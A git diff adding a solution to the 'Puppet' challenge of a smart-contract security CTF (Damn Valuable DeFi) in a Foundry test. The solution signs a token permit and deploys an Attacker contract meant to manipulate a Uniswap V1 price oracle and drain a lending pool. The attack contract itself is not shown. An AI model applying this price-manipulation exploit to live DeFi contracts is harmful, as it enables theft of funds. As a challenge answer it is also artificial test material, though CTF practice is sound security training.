@@ -7,6 +7,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import {Attacker} from "./Attacker.sol";
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -92,7 +93,13 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        address deployedAddr = vm.computeCreateAddress(address(player), 0);
+        console.log(deployedAddr);
+        bytes32 message = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(),
+                        keccak256(abi.encode(keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
+                                player, deployedAddr, PLAYER_INITIAL_TOKEN_BALANCE, 0, block.timestamp))));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, message);
+        new Attacker{value:25 ether}(uniswapV1Exchange, lendingPool, token, v, r, s, recovery);    
     }
 
     // Utility function to calculate Uniswap prices
